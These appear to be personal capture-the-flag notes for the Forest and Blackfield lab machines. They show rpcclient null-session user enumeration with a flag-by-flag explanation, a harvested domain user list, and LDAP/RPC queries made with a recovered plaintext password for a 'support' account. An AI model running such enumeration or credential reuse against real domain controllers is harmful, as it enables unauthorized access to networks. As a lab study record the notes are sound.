
rpcclient -U "" -N 10.129.95.210 -c "enumdomusers"

this command pulls a user list

**RPC (Remote Procedure Call)**. 
On older or misconfigured Windows Servers (like **Forest**), the RPC service often leaks more information than LDAP does.

- **`rpcclient`**: A tool used to execute client-side MS-RPC functions. It’s the "swiss army knife" for interacting with Windows RPC services from Linux.

- **`-U ""`**: Specifies the **Username**. By leaving it empty `""`, you are telling the server you want to connect as an **Anonymous/Null user**.

- **`-N`**: Stands for **No Password**. This prevents the tool from prompting you for a password, which is necessary for a null session.

- **`10.129.95.210`**: The IP address of the Domain Controller (the Forest box).

- **`-c "enumdomusers"`**: The **Command** flag. Instead of opening an interactive shell, it runs the specific function `enumdomusers` (Enumerate Domain Users) and exits.

-----

### Why this works (The Logic)

In Active Directory, the **SAMR (Security Account Manager Remote)** protocol is often accessible via RPC. Even if the server blocks LDAP "dumps" for anonymous users, it might still allow an anonymous user to "query" the list of account names through this legacy interface.

----------

rpcclient -U "" -N 10.129.95.210 -c "enumdomusers" | awk -F'[][]' '{print $2}' > forest-users.txt
                                                                                                                                                                         
┌──(lanc3㉿kali)-[~]
└─$ cat forest-users.txt 
Administrator
Guest
krbtgt
DefaultAccount
$331000-VK4ADACQNUCA
SM_2c8eef0a09b545acb
SM_ca8c2ed5bdab4dc9b
SM_75a538d3025e4db9a
SM_681f53d4942840e18
SM_1b41c9286325456bb
SM_9b69f1b9d2cc45549
SM_7c96b981967141ebb
SM_c75ee099d0a64c91b
SM_1ffab36a2f5f479cb
HealthMailboxc3d7722
HealthMailboxfc9daad
HealthMailboxc0a90c9
HealthMailbox670628e
HealthMailbox968e74d
HealthMailbox6ded678
HealthMailbox83d6781
HealthMailboxfd87238
HealthMailboxb01ac64
HealthMailbox7108a4e
HealthMailbox0659cc1
sebastien
lucinda
svc-alfresco
andy
mark
santi



-----

blackfield

```
nxc ldap 10.129.229.17 -u 'support' -p '#00^BlackKnight' \
  --query "(sAMAccountName=support)" "memberOf"
LDAP        10.129.229.17   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
LDAP        10.129.229.17   389    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight 
LDAP        10.129.229.17   389    DC01             [+] Response for object: CN=support,CN=Users,DC=BLACKFIELD,DC=local
                                                                                                                                                    
┌──(lanc3㉿kali)-[~]
└─$ rpcclient -U 'BLACKFIELD.local/support%#00^BlackKnight' 10.129.229.17 -c "queryuser support"
        User Name   :   support
        Full Name   :
        Home Drive  :
        Dir Drive   :
        Profile Path:
        Logon Script:
        Description :
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Fri, 17 Apr 2026 15:27:49 +08
        Logoff Time              :      Thu, 01 Jan 1970 07:30:00 +0730
        Kickoff Time             :      Thu, 01 Jan 1970 07:30:00 +0730
        Password last set Time   :      Mon, 24 Feb 2020 01:53:24 +08
        Password can change Time :      Tue, 25 Feb 2020 01:53:24 +08
        Password must change Time:      Thu, 14 Sep 30828 10:48:05 +08
        unknown_2[0..31]...
        user_rid :      0x450
        group_rid:      0x201
        acb_info :      0x00010210
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x00000009
        padding1[0..7]...
        logon_hrs[0..21]...

```